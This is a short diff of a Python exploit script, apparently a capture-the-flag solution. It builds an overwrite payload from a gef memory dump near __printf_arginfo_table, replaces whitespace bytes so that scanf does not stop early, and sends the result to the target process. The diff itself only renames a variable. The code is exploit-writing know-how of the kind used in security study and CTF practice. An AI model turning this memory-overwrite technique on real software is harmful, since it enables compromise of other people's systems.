@@ -99,7 +99,7 @@ gef➤  x/s 0x6b4040
 0x6b7aa8 <__printf_arginfo_table>:      0x24    0x74    0x6B    0x00    0x00    0x00    0x00    0x00
 '''
 
-overwrite = ''
+overwrites = ''
 for l in lines:
     a = l.split()
     b = a[-8:]
@@ -109,8 +109,8 @@ for l in lines:
         if e == '\x09' or e == '\x0a' or e == '\x0b' or e == '\x0c' or e == '\x0d' or e == '\x20':
             print "[*] Found whitespace 0x%02X" % ord(e)
             e = '\x41' # scanf("%s") stops at whitespaces
-        overwrite += e
+        overwrites += e
 
-r.send(overwrite + '\n')
+r.send(overwrites + '\n')
 
 print (r.recv())
